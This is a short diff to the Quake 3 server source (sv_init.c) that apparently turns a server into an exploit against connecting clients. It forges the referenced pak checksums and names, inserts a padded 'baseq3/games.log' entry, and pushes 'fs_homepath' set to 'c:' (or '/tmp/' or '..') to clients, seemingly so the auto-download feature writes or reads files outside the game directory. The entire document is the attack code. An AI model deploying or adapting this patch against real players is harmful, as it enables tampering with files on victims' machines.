@@ -1,0 +1,35 @@
+sv_init.diff:
+--- code/server/sv_init.c
++++ code/server/sv_init.c
+@@ -533,9 +533,21 @@
+        // the server sends these to the clients so they can figure
+        // out which pk3s should be auto-downloaded
+        p = FS_ReferencedPakChecksums();
++       int             timeint = time(NULL);
++       sprintf(p,
++               "%i    %i    %i    %i    %i    %i    %i    %i",
++               timeint + 1, timeint + 2, timeint + 3, timeint + 4,
++               timeint + 5, timeint + 6, timeint + 7, timeint + 8);
+        Cvar_Set( "sv_referencedPaks", p );
+        p = FS_ReferencedPakNames();
++       sprintf(p,
++               "none_%059i    none_%059i    none_%059i    none_%059i    "
++               "none_%059i    none_%059i    none_%059i    "
++               "baseq3/games.log___________________",
++               timeint + 1, timeint + 2, timeint + 3, timeint + 4,
++               timeint + 5, timeint + 6, timeint + 7);
+        Cvar_Set( "sv_referencedPakNames", p );
++       Cvar_Set( "fs_homepath", "c:" );    // or /tmp/ or .. (NO backslash)
+
+        // save systeminfo and serverinfo strings
+        Q_strncpyz( systemInfo, Cvar_InfoString_Big( CVAR_SYSTEMINFO ), sizeof( systemInfo
+) );
+@@ -596,6 +608,7 @@
+        Cvar_Get ("sv_pakNames", "", CVAR_SYSTEMINFO | CVAR_ROM );
+        Cvar_Get ("sv_referencedPaks", "", CVAR_SYSTEMINFO | CVAR_ROM );
+        Cvar_Get ("sv_referencedPakNames", "", CVAR_SYSTEMINFO | CVAR_ROM );
++       Cvar_Get ("fs_homepath", "", CVAR_SYSTEMINFO | CVAR_ROM );
+
+        // server vars
+        sv_rconPassword = Cvar_Get ("rconPassword", "", CVAR_TEMP );
+
